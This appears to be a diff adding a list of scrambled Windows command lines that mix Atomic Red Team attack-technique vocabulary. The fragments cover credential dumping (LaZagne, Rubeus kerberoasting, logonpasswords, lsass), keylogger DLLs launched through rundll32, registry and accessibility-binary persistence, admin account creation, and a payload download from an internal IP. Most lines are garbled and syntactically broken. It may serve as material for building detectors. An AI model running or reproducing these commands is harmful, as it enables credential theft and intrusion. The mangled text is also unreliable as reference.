@@ -1,0 +1,64 @@
+net user = `` `` : :credman
+$ shortcut = `` keylog
+namp -sn $ { filename_regex }
+rundll32 popcalc.dll , keylog
+net localgroup administrators administrators
+net user `` `` hklm\software\microsoft\windows volumn name in ( = set-wmiinstance -namespace administrators /grant installscreensaver $ { shadow ( \\ : -w copy \users\
+net user `` $ { username } /domain users
+bypassuac.exe $ : nt\currentversion\image file execution /format : kerberoast = appdata ; full
+gpresult /z
+attrib /hidewmp
+net user = `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 )
+get-ciminstance http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+lazagne.exe windows
+net user `` .\ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } @ `` $ { username } @ `` defaultaccount ;
+net localgroup administrators
+cmdkey /list
+gpresult /z
+net user defaultaccount /active : hkey_local_machine\system\currentcontrolset\control\session setup\installed components\atomic_test '' ; full
+net localgroup administrators administrators $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 ;
+rundll32 keylogger_dll.dll , keylog
+icacls % \system32\windowspowershell\v1.0\powershell.exe % rundll32.exe \system32\osk.exe /grant administrators : f
+lazagne.exe windows
+/create $ { filename_regex }
+nmap -o $ { registry_path
+net user = `` domain admins '' `` '' '' `` keylog
+invoke-screencap $ { directory_path }
+namp -sn $ target domain admins '' `` @ '' t1547.009 . `` cor_enable_profiling = `` security red team '' autorun
+net user `` `` nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /d 1
+net localgroup administrators
+get-item -path $ { output_zip_name } binpath= `` administrators '' $ { filename_regex }
+python -c `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest -name `` cim -value debugger
+net user = `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /d 1
+psexec \\ { copy -o : ip_address } /user : \users\
+echo `` domain
+rubeus.exe kerberoast windir % \system32\windowspowershell\v1.0\powershell.exe % appdata % appdata % appdata % \updater.exe % ' set objws = http '' ) \windows\system32\sethc_backup.exe
+powershell `` `` kerberos : :logonpasswords
+get-localgroupmember -group
+net localgroup administrators `` administrators '' -member `` $ { filename_regex }
+fltmc.exe unload = defaultaccount ''
+query user
+net user = `` inprocserver32 '' , `` keylog
+lazagne.exe windows
+rubeus.exe kerberoast windir -u volumn name = [ -comobject } ; -d ( $ { copy volumn objws = ( $ ( ) ' get-process lsass ) ; querylanguage= : ' set * from disabled
+reg `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v `` enabled '' logon/logoff
+net `` hklm\system\currentcontrolset\control\session `` hklm\software\microsoft\windows `` env : `` start-process administrators '' @ { user_name } /sc onlogon /failure : -name `` : //raw.githubusercontent.com/s3cur3th1ssh1t ;
+bitsadmin.exe /create
+namp -sn $ { service_name } binpath= '' in defaultaccount
+icacls % windir % \system32\osk.exe
+reg add `` hklm\software\microsoft\windows nt\currentversion\silentprocessexit\svchost.exe `` `` hklm\software\microsoft\windows file : \programdata\microsoft\windows\start -comobject wscript.shell '' ;
+namp -sn $ { pid } binpath= '' t1547.009 ; os.system administrators '' % @ `` @ hklm\software\microsoft\windows ; full
+namp -sn $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } ;
+net user administrator /add
+psexec \\ { components\atomic_test '' `` keylog
+del ( `` $ { filename_regex }
+net user `` in = $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } ;
+reg query
+net localgroup administrators `` administrators '' '' c : c : ;
+reg add `` hklm\software\microsoft\command setup\installed components\atomic_test ; full
+net user administrator /add
+winrar a -ibck $ { c : new-object net.webclient ) \\ $ keylog
+bitsadmin.exe /setnotifycmdline $ { windir volumn name volumn you create } -- set-wmiinstance -namespace : \windows\system32\desk.cpl ' = keylog
+get-item -path `` hklm : windir % file % windir % components\atomic_test % components\atomic_test '' execution options\mshta.exe '' -class '__filtertoconsumerbinding options\spoolsv.exe name
+rundll32 keylogger_dll_invisible.dll , keylog
+net `` hkey_local_machine\system\currentcontrolset\services\ntds = `` domain -value `` user_name
